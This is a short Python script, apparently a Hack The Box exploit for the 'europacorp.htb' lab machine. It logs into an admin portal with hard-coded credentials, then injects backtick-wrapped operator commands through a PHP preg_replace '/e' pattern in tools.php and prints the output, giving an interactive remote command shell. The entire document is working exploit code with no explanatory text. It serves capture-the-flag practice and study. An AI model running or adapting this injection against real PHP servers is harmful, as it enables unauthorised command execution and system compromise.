#!/usr/bin/python
import sys
import requests
requests.packages.urllib3.disable_warnings()

print '[-] Authentification ...'

s = requests.Session()
payload = {
    'email': 'admin@europacorp.htb',
    'password': 'SuperSecretPassword!',
    'remember': 'Remember+Me'
}
resp = s.post(
    'https://admin-portal.europacorp.htb/login.php', 
    data=payload,
    verify=False
)

if resp.status_code != 200:
    sys.exit(1)
print '[+] Successfully authicated!'
print '\tPHPSESSID={}\n'.format(s.cookies['PHPSESSID'])

cmd = raw_input('command> ')

payload = {
    'pattern': '/(\w+.*)/e',
    'ipaddress': '`' + cmd + '`',
    'text': '`' + cmd + '`'
}
resp = s.post(
    'https://admin-portal.europacorp.htb/tools.php',
    data=payload,
    verify=False
)

print resp.content.split('<div class="panel-body">')[2].split('<a href="tools.php" class="btn btn-lg btn-success btn-block">New Configuration</a>')[0]

